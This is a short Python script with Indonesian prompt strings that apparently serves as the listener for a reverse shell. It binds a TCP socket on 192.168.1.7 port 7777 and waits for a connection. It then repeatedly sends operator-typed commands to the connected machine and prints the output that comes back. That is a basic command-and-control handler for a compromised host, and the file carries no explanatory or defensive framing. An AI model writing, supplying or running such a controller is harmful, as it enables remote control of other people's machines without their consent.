import socket

sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host='192.168.1.7'
port=7777
sock.bind((host,port))
print('menunggu koneksi ...')
sock.listen(1)
koneksi,target= sock.accept()

print(f'terhubung dengan {target[0]}')

def komunikasi():
    while True:
        perintah=input('tarxvrf>>> ')
        koneksi.send(perintah.encode('utf-8'))
        hasil=terima()
        print(str(hasil))
        
def terima():
    while True:
        data=koneksi.recv(1024).decode('utf-8')   
        return data
             

komunikasi()